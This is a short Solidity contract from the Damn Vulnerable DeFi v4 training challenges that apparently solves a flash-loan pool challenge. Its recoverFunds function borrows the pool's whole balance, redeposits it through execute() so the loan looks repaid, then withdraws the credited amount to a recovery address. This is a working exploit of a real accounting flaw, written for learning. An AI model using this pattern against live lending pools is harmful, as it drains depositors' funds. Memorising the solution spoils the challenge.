// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract FlashLoanEtherReceiver is Ownable, IFlashLoanEtherReceiver {
    IPool private immutable _pool;
    address private immutable _recovery;

    modifier onlyPool() {
        require(msg.sender == address(_pool), "invalid caller");
        _;
    }

    constructor(address pool, address recovery) Ownable(msg.sender) {
        _pool = IPool(pool);
        _recovery = recovery;
    }

    function recoverFunds() external onlyOwner {
        _pool.flashLoan(address(_pool).balance);
        _pool.withdraw();

        (bool success,) = _recovery.call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }

    function execute() external payable onlyPool {
        _pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
